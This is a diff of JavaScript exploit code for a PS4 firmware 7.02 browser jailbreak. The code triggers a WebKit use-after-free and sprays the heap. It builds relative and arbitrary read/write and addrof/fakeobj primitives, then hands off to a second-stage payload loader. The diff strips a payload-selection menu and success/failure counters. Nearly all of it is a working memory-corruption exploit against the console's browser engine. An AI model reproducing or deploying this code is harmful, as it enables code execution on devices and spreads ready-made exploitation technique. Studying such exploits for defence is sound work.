@@ -59,15 +59,14 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("-> Succesfully got a relative R/W");
+			debug_log("[+] Succesfully got a relative R/W");
 			break;
 		}
 	}
-	if (g_relative_rw === null){
-		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-        die("[!] Failed to setup a relative R/W primitive");
-	}
-	debug_log("-> Setting up arbitrary R/W");
+	if (g_relative_rw === null)
+		die("[!] Failed to setup a relative R/W primitive");
+
+	debug_log("[+] Setting up arbitrary R/W");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
@@ -91,27 +90,23 @@ function setupRW() {
 			break;
 		}
 	}
-	if (g_ab_slave === null){
-		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-        die("[!] Didn't found the slave JSArrayBufferView");
-	}
+	if (g_ab_slave === null)
+		die("[!] Didn't found the slave JSArrayBufferView");
+
 	/* Extending the JSArrayBufferView length */
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
-	debug_log("-> Testing arbitrary R/W");
+	debug_log("[+] Testing arbitrary R/W");
 
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
-	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141")){
-		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-        die("[!] Failed to setup arbitrary R/W primitive");}
-	debug_log("Exploited Successfully !!");
-	localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
-	
-	setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.02 - Select the Payloads in its Order of Execution and Click Run..";}, 3500);
+	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
+		die("[!] Failed to setup arbitrary R/W primitive");
+
+	debug_log("[+] Succesfully got arbitrary R/W!");
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -125,153 +120,72 @@ function setupRW() {
 	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
-	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337"))){
-		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-        die("[!] Failed to setup addrof/fakeobj primitives");}
+	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
+		die("[!] Failed to setup addrof/fakeobj primitives");
+	debug_log("[+] Succesfully got addrof/fakeobj");
+
 	/* Getting code execution */
 	/* ... */
-	//startLoad();
-	document.getElementById("myProgress").remove();
-            document.getElementById('load').innerHTML='<tr>'+
-			        '<td align="center" colspan="2" >'+
-			        '<a href="#" class="button" onclick="load_payload();" style="background-color:white;color:#4863A0;width:100%">Run Selected Payload(s)</a>&nbsp;'+
-			        '</td>'+
-			        '</tr>'+
-			        '<tr><td><br/></td></tr>'+
-			        '<tr>'+
-					'<tr>'+
-					'<td align="center" colspan="5" >'+
-					'<a href="#" id="hen" class="button" onclick="toggle_payload(\'hen\'); return false" style="background-color:white;color:#4863A0;width:29%">HEN 2.1.3</a>&nbsp;'+
-					'<a href="#" id="henb" class="button" onclick="toggle_payload(\'henb\'); return false" style="background-color:white;color:#4863A0;width:29%">HEN 2.1.3b</a>&nbsp;'+
-					'<a href="#" id="spoof" class="button" onclick="toggle_payload(\'spoof\'); return false" style="background-color:white;color:#4863A0;width:29%">FW Spoof</a>&nbsp;'+
-					'<a href="#" id="goldhen10" class="button" onclick="toggle_payload(\'goldhen10\'); return false" style="background-color:goldenrod;color:white;width:29%">GoldHEN V1.0</a>&nbsp;'+
-					'<a href="#" id="goldhen11" class="button" onclick="toggle_payload(\'goldhen11\'); return false" style="background-color:goldenrod;color:white;width:29%">GoldHEN V1.1</a>&nbsp;'+
-					'</td>'+
-					'</tr>'+
-					'<tr><td><br/></td></tr>'+
-					'<tr>'+
-					'<td colspan="3" align="center"><hr><br></td>'+
-					'</tr>'+
-					'<tr>'+
-					'<td align="center" colspan="3"><a href="#" id="app2usb" class="button" onclick="toggle_payload(\'app2usb\'); return false" style="background-color:white;color:#4863A0;width:29%">App2USB</a>&nbsp;'+
-					'<a href="#" id="binloader" class="button" onclick="toggle_payload(\'binloader\'); return false" style="background-color:white;color:#4863A0;width:29%">Bin Loader</a>&nbsp;'+
-					'<a href="#" id="ps4debug" class="button" onclick="toggle_payload(\'ps4debug\'); return false" style="background-color:white;color:#4863A0;width:29%">PS4Debug</a>&nbsp;</td>'+
-					'</tr><tr><td><br/></td></tr>'+
-					'<tr>'+
-					'<td align="center" colspan="3"><a href="#" id="disableupdates" class="button" onclick="toggle_payload(\'disableupdates\'); return false" style="background-color:white;color:#4863A0;width:29%">Disable Updates</a>&nbsp;'+
-					'<a href="#" id="enableupdates" class="button" onclick="toggle_payload(\'enableupdates\'); return false" style="background-color:white;color:#4863A0;width:29%">Enable Updates</a>&nbsp;'+
-					'<a href="#" id="ftp" class="button" onclick="toggle_payload(\'ftp\'); return false" style="background-color:white;color:#4863A0;width:29%">FTP</a>&nbsp;</td>'+
-					'</tr><tr><td><br/></td></tr>'+
-					'<tr>'+
-					'<td align="center" colspan="3"><a href="#" id="dumper" class="button" onclick="toggle_payload(\'dumper\'); return false" style="background-color:white;color:#4863A0;width:29%">Dumper</a>&nbsp;'+
-					'<a href="#" id="moduledumper" class="button" onclick="toggle_payload(\'moduledumper\'); return false" style="background-color:white;color:#4863A0;width:29%">Module Dumper</a>&nbsp;'+
-					'<a href="#" id="enablebrowser" class="button" onclick="toggle_payload(\'enablebrowser\'); return false" style="background-color:white;color:#4863A0;width:29%">Enable Browser</a>&nbsp;</td>'+
-					'</tr><tr><td><br/></td></tr>'+
-					'<tr>'+
-					'<tr>'+
-					'<td align="center" colspan="3">'+
-					'<a href="#" id="backup" class="button" onclick="toggle_payload(\'backup\'); return false" style="background-color:white;color:#4863A0;width:29%">Backup</a>&nbsp;'+
-					'<a href="#" id="restore" class="button" onclick="toggle_payload(\'restore\'); return false" style="background-color:white;color:#4863A0;width:29%">Restore</a>&nbsp;'+
-					'<a href="#" id="historyblocker" class="button" onclick="toggle_payload(\'historyblocker\'); return false" style="background-color:white;color:#4863A0;width:29%">History Blocker</a>&nbsp;</td>'+
-					'</tr><tr><td><br/></td></tr>'+
-					'<tr>'+
-					'<td align="center" colspan="3"><a href="#" id="renamer" class="button" onclick="toggle_payload(\'rifrenamer\'); return false" style="background-color:white;color:#4863A0;width:29%">Rif Renamer</a>&nbsp;'+
-					'<a href="#" id="todex" class="button" onclick="toggle_payload(\'todex\'); return false" style="background-color:white;color:#4863A0;width:29%">To-Dex</a>&nbsp;'+
-					'<a href="#" id="disableaslr" class="button" onclick="toggle_payload(\'disableaslr\'); return false" style="background-color:white;color:#4863A0;width:29%">Disable ASLR</a>&nbsp;</td>'+
-					'</tr><tr><td><br/></td></tr>'+
-					'<tr>'+
-					'<td align="center" colspan="3"><a href="#" id="kerneldumper" class="button" onclick="toggle_payload(\'kerneldumper\'); return false" style="background-color:white;color:#4863A0;width:29%">Kernel Dumper</a>&nbsp;'+
-					'<a href="#" id="webrte" class="button" onclick="toggle_payload(\'webrte\'); return false" style="background-color:blue;color:white;width:29%">WebRTE</a>&nbsp;'+
-					'<a href="#" id="fancontrol" class="button" onclick="toggle_payload(\'fancontrol\'); return false" style="background-color:white;color:#4863A0;width:29%">Fan Control</a>&nbsp;</td>'+
-					'</tr>';
-	document.getElementById("div1").remove();
-}
+	var leak_slave = addrof(slave_b);
+	var slave_addr = read64(leak_slave.add(0x10));
 
-function toggle_payload(pld){
-	if(pld=="hen" || pld=="binloader"){if(confirm("HEN (or) Binloader cannot be loaded with any other payloads\nDo you still want to load this payload alone ?")){document.getElementById("pldooe").value = pld; load_payload();}}
-	else{
-		var pldooe = document.getElementById("pldooe").value;
-		var pldooe_full = document.getElementById("pldooe_full").value;
-		var pld_full = document.getElementById(pld).innerHTML + ', ';
-		pld = pld+',';
-		if(pldooe==""){pldooe=pld;pldooe_full=pld_full;}else if(pldooe.includes(pld)){pldooe=pldooe.replace(pld,"");pldooe_full=pldooe_full.replace(pld_full,"");}else{pldooe+=pld;pldooe_full+=pld_full;}
-		document.getElementById("pldooe").value = pldooe;
-		document.getElementById("pldooe_full").value = pldooe_full;
-		if(pldooe!=""){document.getElementById("progress").innerHTML="Order Of Execution - "+pldooe_full.slice(0, -2);}else{document.getElementById("progress").innerHTML="PS4 Jailbreak 7.02 - Select the Payloads in its Order of Execution and Click Run..";}
-	}
-}
+	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
+	var leak_master = addrof(master_b);
+	write64(leak_master.add(0x10), leak_slave.add(0x10));
+	var prim = {
+		write8: function(addr, val) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
 
-function load_payload(){
-	var pld = document.getElementById("pldooe").value;
-	if(pld != ""){
-		var leak_slave = addrof(slave_b);
-		var slave_addr = read64(leak_slave.add(0x10));
-		og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
-		var leak_master = addrof(master_b);
-		write64(leak_master.add(0x10), leak_slave.add(0x10));
-		var prim = {
-			write8: function(addr, val) {
-				master_b[0] = addr.low;
-				master_b[1] = addr.hi;
-
-				if(val instanceof int64) {
-					slave_b[0] = val.low;
-					slave_b[1] = val.hi;
-				}
-				else {
-					slave_b[0] = val;
-					slave_b[1] = 0;
-				}
-
-				master_b[0] = og_slave_addr.low;
-				master_b[1] = og_slave_addr.hi;
-			},
-			write4: function(addr, val) {
-				master_b[0] = addr.low;
-				master_b[1] = addr.hi;
-
+			if(val instanceof int64) {
+				slave_b[0] = val.low;
+				slave_b[1] = val.hi;
+			}
+			else {
 				slave_b[0] = val;
+				slave_b[1] = 0;
+			}
 
-				master_b[0] = og_slave_addr.low;
-				master_b[1] = og_slave_addr.hi;
-			},
-			read8: function(addr) {
-				master_b[0] = addr.low;
-				master_b[1] = addr.hi;
-				var r = new int64(slave_b[0], slave_b[1]);
-				master_b[0] = og_slave_addr.low;
-				master_b[1] = og_slave_addr.hi;
-				return r;
-			},
-			read4: function(addr) {
-				master_b[0] = addr.low;
-				master_b[1] = addr.hi;
-				var r = slave_b[0];
-				master_b[0] = og_slave_addr.low;
-				master_b[1] = og_slave_addr.hi;
-				return r;
-			},
-			leakval: function(val) {
-				g_ab_slave.leakme = val;
-				master_b[0] = g_jsview_butterfly.low32() - 0x10;
-				master_b[1] = g_jsview_butterfly.hi32();
-				var r = new int64(slave_b[0], slave_b[1]);
-				master_b[0] = og_slave_addr.low;
-				master_b[1] = og_slave_addr.hi;
-				return r;
-			},
-		};
-		window.prim = prim;
-		if(pld=='hen'){
-			hen();
-		}else if(pld == 'binloader'){
-			binloader();
-		}else{
-			stage2(pld.slice(0, -1));
-		}
-	}else{
-		alert("Select payload(s) before clicking Run!!");
-	}
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+		},
+		write4: function(addr, val) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+
+			slave_b[0] = val;
+
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+		},
+		read8: function(addr) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+			var r = new int64(slave_b[0], slave_b[1]);
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+			return r;
+		},
+		read4: function(addr) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+			var r = slave_b[0];
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+			return r;
+		},
+		leakval: function(val) {
+			g_ab_slave.leakme = val;
+			master_b[0] = g_jsview_butterfly.low32() - 0x10;
+			master_b[1] = g_jsview_butterfly.hi32();
+			var r = new int64(slave_b[0], slave_b[1]);
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+			return r;
+		},
+	};
+	window.prim = prim;
+	setTimeout(stage2, 1000);
 }
 
 function read(addr, length) {
@@ -330,10 +244,8 @@ function cleanup() {
  * and before deleteBubbleTree
  */
 function confuseTargetObjRound2() {
-	if (findTargetObj() === false) {
-	localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-	die("[!] Failed to reuse target obj.");
-}
+	if (findTargetObj() === false)
+		die("[!] Failed to reuse target obj.");
 
 	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
@@ -343,24 +255,23 @@ function confuseTargetObjRound2() {
 
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-	debug_log("-> Looking for the smashed StringImpl...");
+	debug_log("[+] Looking for the smashed StringImpl...");
 
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("-> StringImpl corrupted successfully");
+			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
 		}
 	}
-	if (g_relative_read === null){
-		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-        die("[!] Failed to setup a relative read primitive");}
+	if (g_relative_read === null)
+		die("[!] Failed to setup a relative read primitive");
 
-	debug_log("-> Got a relative read");
+	debug_log("[+] Got a relative read");
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
@@ -437,7 +348,7 @@ function leakJSC() {
 	 * /!\ 
 	 */
 
-	debug_log("-> JSArrayBufferView: " + g_jsview_leak);
+	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);
 
 	/* Run the exploit again */
 	prepareUAF();
@@ -452,9 +363,8 @@ function confuseTargetObjRound1() {
 	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
 	/* Checking for leaked data */
-	if (findTargetObj() === false){
-		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-        die("[!] Failed to reuse target obj.");}
+	if (findTargetObj() === false)
+		die("[!] Failed to reuse target obj.");
 
 	dumpTargetObj();
 
@@ -512,15 +422,15 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("-> m_timer: " + g_timer_leak);
-	debug_log("-> m_messageHeading: " + g_message_heading_leak);
-	debug_log("-> m_messageBody: " + g_message_body_leak);
+	debug_log("[+] m_timer: " + g_timer_leak);
+	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("-> Found fake ValidationMessage");
+			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -551,7 +461,7 @@ function prepareUAF() {
 	div.appendChild(g_input);
 
 	/* First half spray */
-	for (let i = 0; i < NB_FRAMES/2 ; i++)
+	for (let i = 0; i < NB_FRAMES / 2; i++)
 		g_frames[i].setAttribute("rows", g_rows1);
 
 	/* Instantiate target obj */
@@ -563,12 +473,12 @@ function prepareUAF() {
 
 	g_input.setAttribute("onfocus", "reuseTargetObj()");
 	g_input.autofocus = true;
-	
 }
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("-> Spraying HTMLTextareaElement ...");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
+
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
@@ -596,11 +506,10 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	if(localStorage.is702Cached){
-		/* Init spray */
-		sprayHTMLTextArea();
-		g_input = input1;
-		/* Shape heap layout for obj. reuse */
-		prepareUAF();
-	}
+	/* Init spray */
+	sprayHTMLTextArea();
+
+	g_input = input1;
+	/* Shape heap layout for obj. reuse */
+	prepareUAF();
 }
